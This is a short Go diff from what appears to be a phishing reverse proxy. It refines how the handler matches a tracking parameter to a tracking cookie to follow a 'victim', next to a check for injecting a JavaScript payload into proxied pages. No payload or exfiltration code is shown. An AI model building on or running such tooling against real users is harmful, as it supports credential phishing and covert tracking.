@@ -74,8 +74,8 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 
 	// Do a redirect when tracking cookie was already set . We want to get rid of the TrackingParam from the URL!
 	queryString := r.URL.Query()
-	if _, ok := queryString[runtime.TrackingParam]; ok {
-		if _, err := r.Cookie(runtime.TrackingCookie); err == nil {
+	if uid1, ok := queryString[runtime.TrackingParam]; ok {
+		if uid2, err := r.Cookie(runtime.TrackingCookie); err == nil && uid1[0] == uid2.Value {
 			delete(queryString, runtime.TrackingParam)
 			r.URL.RawQuery = queryString.Encode()
 			log.Infof("User tracking: Redirecting client to %s", r.URL.String())
@@ -135,15 +135,13 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 		reverseProxy.RequestContext.InitUserID = val[0]
 		reverseProxy.RequestContext.UserID = val[0]
 		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
+	} else if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
+		reverseProxy.RequestContext.UserID = cookie.Value
 	}
 
 	//check if JS Payload should be injected
 	if payload := runtime.GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
 		reverseProxy.Payload = payload
-	}
-
-	if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
-		reverseProxy.RequestContext.UserID = cookie.Value
 	}
 
 	reverseProxy.Proxy.ServeHTTP(w, r)
